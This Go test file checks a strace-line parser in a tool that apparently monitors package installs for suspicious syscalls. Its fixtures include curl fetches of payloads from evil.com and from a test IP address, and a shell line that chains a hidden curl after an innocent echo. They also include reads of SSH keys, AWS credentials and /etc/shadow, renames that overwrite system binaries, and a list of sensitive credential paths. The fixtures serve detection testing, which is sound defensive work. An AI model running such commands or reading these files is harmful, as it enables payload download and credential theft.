package probe

import (
	"testing"

	"github.com/RalianENG/kojuto/internal/types"
)

func TestParseStraceLine_Connect_IPv4(t *testing.T) {
	line := `[pid 12345] connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = -1 ENETUNREACH`

	evt, ok := parseStraceLine(line)
	if !ok {
		t.Fatal("expected parse to succeed")
	}

	if evt.Syscall != types.EventConnect {
		t.Errorf("expected syscall connect, got %s", evt.Syscall)
	}

	if evt.DstPort != 443 {
		t.Errorf("expected port 443, got %d", evt.DstPort)
	}

	if evt.DstAddr != "93.184.216.34" {
		t.Errorf("expected addr 93.184.216.34, got %s", evt.DstAddr)
	}

	if evt.PID != 12345 {
		t.Errorf("expected pid 12345, got %d", evt.PID)
	}
}

func TestParseStraceLine_Connect_IPv6(t *testing.T) {
	line := `[pid 999] connect(5, {sa_family=AF_INET6, sin6_port=htons(80), sin6_addr=inet6_addr("::1")}, 28) = 0`

	evt, ok := parseStraceLine(line)
	if !ok {
		t.Fatal("expected parse to succeed")
	}

	if evt.Family != 10 {
		t.Errorf("expected family 10 (AF_INET6), got %d", evt.Family)
	}
}

func TestParseStraceLine_Sendto(t *testing.T) {
	line := `[pid 500] sendto(4, "\0\0\1\0\0\1...", 29, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, 16) = 29`

	evt, ok := parseStraceLine(line)
	if !ok {
		t.Fatal("expected sendto parse to succeed")
	}

	if evt.Syscall != types.EventSendto {
		t.Errorf("expected syscall sendto, got %s", evt.Syscall)
	}

	if evt.DstPort != 53 {
		t.Errorf("expected port 53, got %d", evt.DstPort)
	}

	if evt.DstAddr != "8.8.8.8" {
		t.Errorf("expected addr 8.8.8.8, got %s", evt.DstAddr)
	}
}

func TestParseStraceLine_Execve(t *testing.T) {
	line := `[pid 777] execve("/usr/bin/curl", ["curl", "http://evil.com/payload"], 0x...) = 0`

	evt, ok := parseStraceLine(line)
	if !ok {
		t.Fatal("expected execve parse to succeed")
	}

	if evt.Syscall != types.EventExecve {
		t.Errorf("expected syscall execve, got %s", evt.Syscall)
	}

	if evt.Comm != "/usr/bin/curl" {
		t.Errorf("expected comm /usr/bin/curl, got %s", evt.Comm)
	}

	if evt.Cmdline != "curl http://evil.com/payload" {
		t.Errorf("expected cmdline 'curl http://evil.com/payload', got %q", evt.Cmdline)
	}

	if evt.PID != 777 {
		t.Errorf("expected pid 777, got %d", evt.PID)
	}
}

func TestParseStraceLine_Irrelevant(t *testing.T) {
	lines := []string{
		"openat(AT_FDCWD, \"/etc/hosts\", O_RDONLY) = 3",                               // non-sensitive path
		"connect(3, {sa_family=AF_UNIX, sun_path=\"/var/run/nscd/socket\"}, 110) = -1", // AF_UNIX
		"",
		"some random text",
	}

	for _, line := range lines {
		if _, ok := parseStraceLine(line); ok {
			t.Errorf("expected parse to fail for %q", line)
		}
	}
}

func TestParseStraceLine_ExecveFailedENOENT(t *testing.T) {
	// Failed execve (ENOENT) should be skipped — it's a normal PATH lookup.
	lines := []string{
		`[pid    33] execve("/usr/local/bin/curl", ["curl", "http://198.51.100.1/payload"], 0x7fff29c11690 /* 8 vars */) = -1 ENOENT (No such file or directory)`,
		`[pid    30] execve("/usr/local/bin/lsb_release", ["lsb_release", "-a"], 0x7ffdd868e370 /* 7 vars */) = -1 ENOENT (No such file or directory)`,
		`[pid    19] execve("/usr/sbin/curl", ["curl", "http://evil.com"], 0x7fff /* 8 vars */) = -1 EACCES (Permission denied)`,
	}

	for _, line := range lines {
		if _, ok := parseStraceLine(line); ok {
			t.Errorf("expected failed execve to be skipped: %s", line)
		}
	}
}

func TestParseStraceLine_ExecveSuccess(t *testing.T) {
	// Successful execve (= 0) should be parsed.
	line := `[pid    34] execve("/bin/sh", ["sh", "-c", "--", "echo innocent ; curl http://198."], 0x7fff29c11690 /* 8 vars */) = 0`

	evt, ok := parseStraceLine(line)
	if !ok {
		t.Fatal("expected successful execve to be parsed")
	}

	if evt.Comm != "/bin/sh" {
		t.Errorf("expected comm /bin/sh, got %s", evt.Comm)
	}
}

func TestParseStraceLine_OpenatSensitive(t *testing.T) {
	cases := []struct {
		name      string
		line      string
		wantPath  string
		wantFlags string
	}{
		{
			name:      "SSH key read",
			line:      `[pid 100] openat(AT_FDCWD, "/home/dev/.ssh/id_rsa", O_RDONLY) = 3`,
			wantPath:  "/home/dev/.ssh/id_rsa",
			wantFlags: "O_RDONLY",
		},
		{
			name:      "AWS credentials",
			line:      `[pid 200] openat(AT_FDCWD, "/home/dev/.aws/credentials", O_RDONLY|O_CLOEXEC) = 4`,
			wantPath:  "/home/dev/.aws/credentials",
			wantFlags: "O_RDONLY|O_CLOEXEC",
		},
		{
			name:      "proc environ",
			line:      `[pid 300] openat(AT_FDCWD, "/proc/self/environ", O_RDONLY) = 5`,
			wantPath:  "/proc/self/environ",
			wantFlags: "O_RDONLY",
		},
		{
			name:      "etc shadow",
			line:      `openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = -1 EACCES`,
			wantPath:  "/etc/shadow",
			wantFlags: "O_RDONLY",
		},
		{
			name:      "git-credentials",
			line:      `[pid 400] openat(AT_FDCWD, "/home/dev/.git-credentials", O_RDONLY) = 6`,
			wantPath:  "/home/dev/.git-credentials",
			wantFlags: "O_RDONLY",
		},
		{
			name:      "docker config",
			line:      `[pid 500] openat(3, "/home/dev/.docker/config.json", O_RDONLY|O_CLOEXEC) = 7`,
			wantPath:  "/home/dev/.docker/config.json",
			wantFlags: "O_RDONLY|O_CLOEXEC",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			evt, ok := parseStraceLine(tc.line)
			if !ok {
				t.Fatal("expected parse to succeed")
			}
			if evt.Syscall != types.EventOpenat {
				t.Errorf("expected openat, got %s", evt.Syscall)
			}
			if evt.FilePath != tc.wantPath {
				t.Errorf("expected path %s, got %s", tc.wantPath, evt.FilePath)
			}
			if evt.OpenFlags != tc.wantFlags {
				t.Errorf("expected flags %s, got %s", tc.wantFlags, evt.OpenFlags)
			}
		})
	}
}

func TestParseStraceLine_OpenatNonSensitive(t *testing.T) {
	// Non-sensitive paths should NOT produce events.
	lines := []string{
		`[pid 100] openat(AT_FDCWD, "/usr/lib/python3.12/os.py", O_RDONLY) = 3`,
		`[pid 200] openat(AT_FDCWD, "/etc/hosts", O_RDONLY) = 4`,
		`openat(AT_FDCWD, "/tmp/pip-install-xyz/setup.py", O_RDONLY) = 5`,
	}

	for _, line := range lines {
		if _, ok := parseStraceLine(line); ok {
			t.Errorf("expected non-sensitive openat to be skipped: %s", line)
		}
	}
}

func TestParseStraceLine_Rename(t *testing.T) {
	cases := []struct {
		name    string
		line    string
		wantSrc string
		wantDst string
	}{
		{
			name:    "simple rename",
			line:    `[pid 100] rename("/tmp/evil", "/usr/local/bin/python3") = 0`,
			wantSrc: "/tmp/evil",
			wantDst: "/usr/local/bin/python3",
		},
		{
			name:    "renameat",
			line:    `[pid 200] renameat(AT_FDCWD, "/tmp/payload", AT_FDCWD, "/usr/bin/node") = 0`,
			wantSrc: "/tmp/payload",
			wantDst: "/usr/bin/node",
		},
		{
			name:    "renameat2",
			line:    `[pid 300] renameat2(5, "/tmp/x", 6, "/bin/sh", 0) = 0`,
			wantSrc: "/tmp/x",
			wantDst: "/bin/sh",
		},
		{
			name:    "rename to non-trusted dir",
			line:    `[pid 400] rename("/tmp/a", "/install/lib/module.so") = 0`,
			wantSrc: "/tmp/a",
			wantDst: "/install/lib/module.so",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			evt, ok := parseStraceLine(tc.line)
			if !ok {
				t.Fatal("expected parse to succeed")
			}
			if evt.Syscall != types.EventRename {
				t.Errorf("expected rename, got %s", evt.Syscall)
			}
			if evt.SrcPath != tc.wantSrc {
				t.Errorf("expected src %s, got %s", tc.wantSrc, evt.SrcPath)
			}
			if evt.DstPath != tc.wantDst {
				t.Errorf("expected dst %s, got %s", tc.wantDst, evt.DstPath)
			}
		})
	}
}

func TestIsSensitivePath(t *testing.T) {
	sensitive := []string{
		"/home/dev/.ssh/id_rsa",
		"/root/.gnupg/secring.gpg",
		"/home/user/.aws/credentials",
		"/etc/shadow",
		"/proc/self/environ",
		"/home/dev/.netrc",
		"/home/dev/.git-credentials",
		"/home/dev/.docker/config.json",
		"/home/dev/.config/gh/hosts.yml",
	}
	for _, p := range sensitive {
		if !isSensitivePath(p) {
			t.Errorf("expected %s to be sensitive", p)
		}
	}

	benign := []string{
		"/etc/hosts",
		"/usr/lib/python3.12/os.py",
		"/tmp/pip-install-xyz/setup.py",
		"/home/dev/.bashrc",
		"/home/dev/.npmrc",
	}
	for _, p := range benign {
		if isSensitivePath(p) {
			t.Errorf("expected %s to NOT be sensitive", p)
		}
	}
}

func TestParseStraceLine_NoPID(t *testing.T) {
	line := `connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("127.0.0.1")}, 16) = 0`

	evt, ok := parseStraceLine(line)
	if !ok {
		t.Fatal("expected parse to succeed")
	}

	if evt.PID != 0 {
		t.Errorf("expected pid 0 (no pid prefix), got %d", evt.PID)
	}
}
